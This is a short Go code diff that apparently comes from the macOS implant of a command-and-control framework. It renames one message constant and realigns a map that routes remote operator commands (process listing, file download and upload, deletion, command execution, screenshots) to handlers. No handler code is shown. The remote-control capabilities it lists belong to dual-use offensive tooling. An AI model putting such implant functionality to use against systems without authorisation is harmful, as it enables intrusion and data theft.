@@ -29,18 +29,18 @@ import (
 
 var (
 	darwinHandlers = map[uint32]RPCHandler{
-		pb.MsgPsReq:       psHandler,
-		pb.MsgTerminate:   terminateHandler,
-		pb.MsgPing:        pingHandler,
-		pb.MsgLsReq:       dirListHandler,
-		pb.MsgDownloadReq: downloadHandler,
-		pb.MsgUploadReq:   uploadHandler,
-		pb.MsgCdReq:       cdHandler,
-		pb.MsgPwdReq:      pwdHandler,
-		pb.MsgRmReq:       rmHandler,
-		pb.MsgMkdirReq:    mkdirHandler,
-		pb.MsgIfconfigReq: ifconfigHandler,
-		pb.MsgExecuteReq:  executeHandler,
+		pb.MsgPsReq:        psHandler,
+		pb.MsgTerminateReq: terminateHandler,
+		pb.MsgPing:         pingHandler,
+		pb.MsgLsReq:        dirListHandler,
+		pb.MsgDownloadReq:  downloadHandler,
+		pb.MsgUploadReq:    uploadHandler,
+		pb.MsgCdReq:        cdHandler,
+		pb.MsgPwdReq:       pwdHandler,
+		pb.MsgRmReq:        rmHandler,
+		pb.MsgMkdirReq:     mkdirHandler,
+		pb.MsgIfconfigReq:  ifconfigHandler,
+		pb.MsgExecuteReq:   executeHandler,
 
 		pb.MsgScreenshotReq: screenshotHandler,
 
